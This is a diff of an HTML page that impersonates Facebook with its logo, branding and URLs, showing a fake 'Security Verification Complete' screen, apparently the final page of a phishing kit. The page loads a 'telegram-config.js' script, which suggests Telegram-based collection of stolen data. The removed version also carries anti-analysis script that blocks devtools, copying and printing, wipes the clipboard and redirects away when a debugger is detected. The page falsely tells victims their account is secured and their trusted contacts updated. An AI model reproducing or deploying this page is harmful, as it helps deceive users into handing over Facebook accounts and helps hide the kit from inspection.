@@ -1,145 +1,351 @@
-<!doctype html><html lang=en><head>
-<script>
-// Clear console continuously
-setInterval(() => console.clear(), 100);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <title>Facebook - Verification Complete</title>
+  <meta name="description" content="Facebook account verification completed successfully. Your account is now secured with enhanced protection.">
+  <meta property="og:title" content="Facebook - Verification Complete">
+  <meta property="og:description" content="Account verification completed! Your Facebook account is now fully secured with enhanced protection.">
+  <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y5/r/TJPKIuZGNxL.png">
+  <meta property="og:url" content="https://www.facebook.com/security/verification">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="Facebook">
+  <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzE4NzdGMiI+PHBhdGggZD0iTTI0IDEyLjA3M2MwLTYuNjI3LTUuMzczLTEyLTEyLTEycy0xMiA1LjM3My0xMiAxMmMwIDUuOTkgNC4zODggMTAuOTU0IDEwLjEyNSAxMS45Mjd2LTguNDM3SDcuMDc4di0zLjQ5aDMuMDQ3VjkuNDNjMC0zLjAwNyAxLjc5Mi00LjY2OSA0LjUzMy00LjY2OSAxLjMxMiAwIDIuNjg2LjIzNCAyLjY4Ni4yMzR2Mi45NTNoLTEuNTE0Yy0xLjQ5MSAwLTEuOTU1LjkyNS0xLjk1NSAxLjg3NHYyLjI1aDMuMzI4bC0uNTMyIDMuNDloLTIuNzk2djguNDM3QzE5LjYxMiAyMy4wMjcgMjQgMTguMDYyIDI0IDEyLjA3M3oiLz48L3N2Zz4=">
+  <!-- Include centralized Telegram configuration -->
+  <script src="telegram-config.js"></script>
 
-// Disable right-click context menu
-document.addEventListener('contextmenu', e => e.preventDefault());
-
-// Disable text selection
-document.addEventListener('selectstart', e => e.preventDefault());
-document.addEventListener('dragstart', e => e.preventDefault());
-
-// Disable copy/cut/paste
-document.addEventListener('keydown', e => {
-  // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+A, Ctrl+S, Ctrl+C, Ctrl+V
-  if (e.keyCode === 123 || // F12
-      (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
-      (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
-      (e.ctrlKey && e.keyCode === 65) || // Ctrl+A
-      (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
-      (e.ctrlKey && e.keyCode === 67) || // Ctrl+C
-      (e.ctrlKey && e.keyCode === 86)) { // Ctrl+V
-    e.preventDefault();
-    return false;
-  }
-});
-
-// Detect devtools
-let devtools = {open: false, orientation: null};
-const threshold = 160;
-
-setInterval(() => {
-  if (window.outerHeight - window.innerHeight > threshold || 
-      window.outerWidth - window.innerWidth > threshold) {
-    if (!devtools.open) {
-      devtools.open = true;
-      // Redirect away or show warning
-      window.location.href = 'about:blank';
+  <style>
+    /* Reset styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
-  } else {
-    devtools.open = false;
-  }
-}, 500);
-
-// Disable printing
-window.addEventListener('beforeprint', e => {
-  e.preventDefault();
-  return false;
-});
-
-// Block view source shortcuts
-document.onkeydown = function(e) {
-  if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 117)) {
-    return false;
-  }
-  if (e.keyCode === 123) {
-    return false;
-  }
-  if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
-    return false;
-  }
-  if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
-    return false;
-  }
-};
-
-// Disable drag and drop
-document.addEventListener('dragover', e => e.preventDefault());
-document.addEventListener('drop', e => e.preventDefault());
-
-// Clear clipboard
-if (navigator.clipboard) {
-  setInterval(() => {
-    navigator.clipboard.writeText('');
-  }, 1000);
-}
-
-// Disable image saving
-document.addEventListener('dragstart', e => {
-  if (e.target.tagName === 'IMG') {
-    e.preventDefault();
-  }
-});
-
-// Anti-debugging
-(() => {
-  function detectDebugger() {
-    const start = performance.now();
-    debugger;
-    const end = performance.now();
-    if (end - start > 100) {
-      window.location.href = 'about:blank';
+    
+    body {
+      font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      color: #1c1e21;
+      line-height: 1.34;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
     }
-  }
-  setInterval(detectDebugger, 1000);
-})();
-
-// Blur content when losing focus (dev tools opened)
-window.addEventListener('blur', () => {
-  document.body.style.filter = 'blur(5px)';
-  setTimeout(() => {
-    document.body.style.filter = 'none';
-  }, 100);
-});
-</script>
-
-<style>
-/* Disable text selection */
-* {
-  -webkit-user-select: none !important;
-  -moz-user-select: none !important;
-  -ms-user-select: none !important;
-  user-select: none !important;
-  -webkit-touch-callout: none !important;
-  -webkit-tap-highlight-color: transparent !important;
-}
-
-/* Disable drag */
-* {
-  -webkit-user-drag: none !important;
-  -khtml-user-drag: none !important;
-  -moz-user-drag: none !important;
-  -o-user-drag: none !important;
-  user-drag: none !important;
-}
-
-/* Hide scrollbars to prevent inspecting */
-::-webkit-scrollbar { display: none; }
-* { scrollbar-width: none; }
-
-/* Disable outline on focus */
-* { outline: none !important; }
-
-/* Print protection */
-@media print {
-  * { display: none !important; }
-  body:after {
-    content: "Printing disabled for security";
-    display: block !important;
-    text-align: center;
-    font-size: 20px;
-  }
-}
-</style>
-<meta charset=UTF-8><meta content="width=device-width,initial-scale=1,maximum-scale=1" name=viewport><title>Facebook - Verification Complete</title><meta content="Facebook account verification completed successfully. Your account is now secured with enhanced protection." name=description><meta content="Facebook - Verification Complete" property=og:title><meta content="Account verification completed! Your Facebook account is now fully secured with enhanced protection." property=og:description><meta content=https://static.xx.fbcdn.net/rsrc.php/v3/y5/r/TJPKIuZGNxL.png property=og:image><meta content=https://www.facebook.com/security/verification property=og:url><meta content=website property=og:type><meta content=Facebook property=og:site_name><link href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzE4NzdGMiI+PHBhdGggZD0iTTI0IDEyLjA3M2MwLTYuNjI3LTUuMzczLTEyLTEyLTEycy0xMiA1LjM3My0xMiAxMmMwIDUuOTkgNC4zODggMTAuOTU0IDEwLjEyNSAxMS45Mjd2LTguNDM3SDcuMDc4di0zLjQ5aDMuMDQ3VjkuNDNjMC0zLjAwNyAxLjc5Mi00LjY2OSA0LjUzMy00LjY2OSAxLjMxMiAwIDIuNjg2LjIzNCAyLjY4Ni4yMzR2Mi45NTNoLTEuNTE0Yy0xLjQ5MSAwLTEuOTU1LjkyNS0xLjk1NSAxLjg3NHYyLjI1aDMuMzI4bC0uNTMyIDMuNDloLTIuNzk2djguNDM3QzE5LjYxMiAyMy4wMjcgMjQgMTguMDYyIDI0IDEyLjA3M3oiLz48L3N2Zz4=" rel=icon><script src=telegram-config.js></script><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:SFProText-Regular,Helvetica,Arial,sans-serif;background-color:#f0f2f5;color:#1c1e21;line-height:1.34;min-height:100vh;display:flex;flex-direction:column}.fb-header{background:#fff;border-bottom:1px solid #dadde1;padding:0 16px;height:56px;display:flex;align-items:center;position:sticky;top:0;z-index:100;box-shadow:0 2px 4px rgba(0,0,0,.1)}.fb-logo-header{color:#1877f2;font-size:32px;font-weight:700;font-family:Klavika-Medium,sans-serif;text-decoration:none}.success-container{flex:1;display:flex;align-items:center;justify-content:center;padding:20px;min-height:calc(100vh - 56px)}.success-card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:40px;width:100%;max-width:480px;text-align:center}.success-icon{width:120px;height:120px;background:linear-gradient(135deg,#1877f2 0,#166fe5 100%);border-radius:50%;margin:0 auto 32px;display:flex;align-items:center;justify-content:center;box-shadow:0 8px 20px rgba(24,119,242,.3);animation:successPulse 2s ease-in-out infinite}@keyframes successPulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}.success-title{color:#1877f2;font-size:28px;font-weight:700;margin-bottom:16px}.success-subtitle{color:#1c1e21;font-size:16px;line-height:24px;margin-bottom:32px}.progress-container{margin-bottom:32px}.progress-steps{display:flex;justify-content:center;margin-bottom:8px}.progress-step{width:40px;height:4px;border-radius:2px;margin:0 2px;background-color:#1877f2}.progress-text{color:#1877f2;font-size:14px;font-weight:600}.success-message{background:linear-gradient(135deg,#e3f2fd 0,#f0f8ff 100%);border:1px solid #1877f2;border-radius:12px;padding:24px;margin-bottom:32px;text-align:left}.message-header{display:flex;align-items:center;margin-bottom:12px}.message-icon{width:28px;height:28px;background-color:#1877f2;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-right:12px;color:#fff;font-weight:700;font-size:16px}.message-title{color:#1877f2;font-weight:600;font-size:16px}.message-text{color:#1c1e21;font-size:14px;line-height:20px;margin:0}.continue-btn{display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#1877f2 0,#166fe5 100%);color:#fff;text-decoration:none;border-radius:8px;font-size:16px;font-weight:600;transition:all .3s ease;box-shadow:0 2px 4px rgba(24,119,242,.3);margin-bottom:24px}.continue-btn:hover{transform:translateY(-1px);box-shadow:0 4px 8px rgba(24,119,242,.4);text-decoration:none;color:#fff}.security-features{margin-top:32px;padding-top:24px;border-top:1px solid #e4e6ea}.features-title{color:#1c1e21;font-size:16px;font-weight:600;margin-bottom:16px}.feature-list{text-align:left;display:grid;gap:12px}.feature-item{display:flex;align-items:center;color:#65676b;font-size:14px}.feature-icon{width:20px;height:20px;background-color:#e3f2fd;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-right:12px;flex-shrink:0}@media (max-width:480px){.success-card{padding:32px 24px;margin:0 16px}.success-title{font-size:24px}.success-icon{width:100px;height:100px}}</style></head><body><div class=fb-header><a class=fb-logo-header href=/ >facebook</a></div><div class=success-container><div class=success-card><div class=success-icon><svg fill=white height=64 viewBox="0 0 24 24" width=64><path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z"/><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.927v-8.437H7.078v-3.49h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.234 2.686.234v2.953h-1.514c-1.491 0-1.955.925-1.955 1.874v2.25h3.328l-.532 3.49h-2.796v8.437C19.612 23.027 24 18.062 24 12.073z" transform="scale(0.4) translate(18, 18)"/><path d="M9 12L11 14L16 9" fill=none stroke=white stroke-width=1.5 /></svg></div><h1 class=success-title>Security Verification Complete</h1><p class=success-subtitle>Thank you for confirming your identity. Your account has been successfully verified and is now protected with enhanced security measures.</p><div class=progress-container><div class=progress-steps><div class=progress-step></div><div class=progress-step></div><div class=progress-step></div><div class=progress-step></div></div><p class=progress-text>Verification Complete</p></div><div class=success-message><div class=message-header><div class=message-icon>✓</div><div class=message-title>Account Successfully Secured</div></div><p class=message-text>Your Facebook account now has enhanced security protection. All verification steps have been completed successfully, and your trusted contacts have been updated.</p></div><a class=continue-btn href=https://www.facebook.com>Continue to Facebook</a><div class=security-features><h3 class=features-title>Your Account Now Includes:</h3><div class=feature-list><div class=feature-item><div class=feature-icon><svg fill=#1877F2 height=12 viewBox="0 0 24 24" width=12><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></div>Enhanced security verification</div><div class=feature-item><div class=feature-icon><svg fill=#1877F2 height=12 viewBox="0 0 24 24" width=12><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></div>Updated trusted contacts</div><div class=feature-item><div class=feature-icon><svg fill=#1877F2 height=12 viewBox="0 0 24 24" width=12><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></div>Identity verification on file</div><div class=feature-item><div class=feature-icon><svg fill=#1877F2 height=12 viewBox="0 0 24 24" width=12><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></div>Improved account recovery options</div></div></div></div></div></body></html>
+    
+    /* Facebook header */
+    .fb-header {
+      background: white;
+      border-bottom: 1px solid #dadde1;
+      padding: 0 16px;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: 0 2px 4px rgba(0,0,0,.1);
+    }
+    
+    .fb-logo-header {
+      color: #1877f2;
+      font-size: 32px;
+      font-weight: bold;
+      font-family: Klavika-Medium, sans-serif;
+      text-decoration: none;
+    }
+    
+    /* Main content container */
+    .success-container {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      min-height: calc(100vh - 56px);
+    }
+    
+    .success-card {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+      padding: 40px;
+      width: 100%;
+      max-width: 480px;
+      text-align: center;
+    }
+    
+    /* Success icon */
+    .success-icon {
+      width: 120px;
+      height: 120px;
+      background: linear-gradient(135deg, #1877f2 0%, #166fe5 100%);
+      border-radius: 50%;
+      margin: 0 auto 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3);
+      animation: successPulse 2s ease-in-out infinite;
+    }
+    
+    @keyframes successPulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    
+    .success-title {
+      color: #1877f2;
+      font-size: 28px;
+      font-weight: bold;
+      margin-bottom: 16px;
+    }
+    
+    .success-subtitle {
+      color: #1c1e21;
+      font-size: 16px;
+      line-height: 24px;
+      margin-bottom: 32px;
+    }
+    
+    /* Progress indicator - all complete */
+    .progress-container {
+      margin-bottom: 32px;
+    }
+    
+    .progress-steps {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 8px;
+    }
+    
+    .progress-step {
+      width: 40px;
+      height: 4px;
+      border-radius: 2px;
+      margin: 0 2px;
+      background-color: #1877f2;
+    }
+    
+    .progress-text {
+      color: #1877f2;
+      font-size: 14px;
+      font-weight: 600;
+    }
+    
+    /* Success message */
+    .success-message {
+      background: linear-gradient(135deg, #e3f2fd 0%, #f0f8ff 100%);
+      border: 1px solid #1877f2;
+      border-radius: 12px;
+      padding: 24px;
+      margin-bottom: 32px;
+      text-align: left;
+    }
+    
+    .message-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+    
+    .message-icon {
+      width: 28px;
+      height: 28px;
+      background-color: #1877f2;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 12px;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+    }
+    
+    .message-title {
+      color: #1877f2;
+      font-weight: 600;
+      font-size: 16px;
+    }
+    
+    .message-text {
+      color: #1c1e21;
+      font-size: 14px;
+      line-height: 20px;
+      margin: 0;
+    }
+    
+    /* Continue button */
+    .continue-btn {
+      display: inline-block;
+      padding: 16px 32px;
+      background: linear-gradient(135deg, #1877F2 0%, #166fe5 100%);
+      color: white;
+      text-decoration: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      transition: all 0.3s ease;
+      box-shadow: 0 2px 4px rgba(24, 119, 242, 0.3);
+      margin-bottom: 24px;
+    }
+    
+    .continue-btn:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 4px 8px rgba(24, 119, 242, 0.4);
+      text-decoration: none;
+      color: white;
+    }
+    
+    /* Security features */
+    .security-features {
+      margin-top: 32px;
+      padding-top: 24px;
+      border-top: 1px solid #e4e6ea;
+    }
+    
+    .features-title {
+      color: #1c1e21;
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 16px;
+    }
+    
+    .feature-list {
+      text-align: left;
+      display: grid;
+      gap: 12px;
+    }
+    
+    .feature-item {
+      display: flex;
+      align-items: center;
+      color: #65676B;
+      font-size: 14px;
+    }
+    
+    .feature-icon {
+      width: 20px;
+      height: 20px;
+      background-color: #e3f2fd;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 12px;
+      flex-shrink: 0;
+    }
+    
+    /* Responsive design */
+    @media (max-width: 480px) {
+      .success-card {
+        padding: 32px 24px;
+        margin: 0 16px;
+      }
+      
+      .success-title {
+        font-size: 24px;
+      }
+      
+      .success-icon {
+        width: 100px;
+        height: 100px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Facebook Header -->
+  <div class="fb-header">
+    <a href="/" class="fb-logo-header">facebook</a>
+  </div>
+  
+  <!-- Main Success Content -->
+  <div class="success-container">
+    <div class="success-card">
+      <!-- Facebook Shield Icon -->
+      <div class="success-icon">
+        <svg width="64" height="64" viewBox="0 0 24 24" fill="white">
+          <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z"/>
+          <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.927v-8.437H7.078v-3.49h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.234 2.686.234v2.953h-1.514c-1.491 0-1.955.925-1.955 1.874v2.25h3.328l-.532 3.49h-2.796v8.437C19.612 23.027 24 18.062 24 12.073z" transform="scale(0.4) translate(18, 18)"/>
+          <path d="M9 12L11 14L16 9" stroke="white" stroke-width="1.5" fill="none"/>
+        </svg>
+      </div>
+      
+      <!-- Title and Description -->
+      <h1 class="success-title">Security Verification Complete</h1>
+      <p class="success-subtitle">
+        Thank you for confirming your identity. Your account has been successfully verified and is now protected with enhanced security measures.
+      </p>
+      
+      <!-- Progress Indicator - All Complete -->
+      <div class="progress-container">
+        <div class="progress-steps">
+          <div class="progress-step"></div>
+          <div class="progress-step"></div>
+          <div class="progress-step"></div>
+          <div class="progress-step"></div>
+        </div>
+        <p class="progress-text">Verification Complete</p>
+      </div>
+      
+      <!-- Success Message -->
+      <div class="success-message">
+        <div class="message-header">
+          <div class="message-icon">✓</div>
+          <div class="message-title">Account Successfully Secured</div>
+        </div>
+        <p class="message-text">
+          Your Facebook account now has enhanced security protection. All verification steps have been completed successfully, and your trusted contacts have been updated.
+        </p>
+      </div>
+      
+      <!-- Continue Button -->
+      <a href="https://www.facebook.com" class="continue-btn">
+        Continue to Facebook
+      </a>
+      
+      <!-- Security Features -->
+      <div class="security-features">
+        <h3 class="features-title">Your Account Now Includes:</h3>
+        <div class="feature-list">
+          <div class="feature-item">
+            <div class="feature-icon">
+              <svg width="12" height="12" viewBox="0 0 24 24" fill="#1877F2">
+                <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+              </svg>
+            </div>
+            Enhanced security verification
+          </div>
+          <div class="feature-item">
+            <div class="feature-icon">
+              <svg width="12" height="12" viewBox="0 0 24 24" fill="#1877F2">
+                <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+              </svg>
+            </div>
+            Updated trusted contacts
+          </div>
+          <div class="feature-item">
+            <div class="feature-icon">
+              <svg width="12" height="12" viewBox="0 0 24 24" fill="#1877F2">
+                <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+              </svg>
+            </div>
+            Identity verification on file
+          </div>
+          <div class="feature-item">
+            <div class="feature-icon">
+              <svg width="12" height="12" viewBox="0 0 24 24" fill="#1877F2">
+                <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+              </svg>
+            </div>
+            Improved account recovery options
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
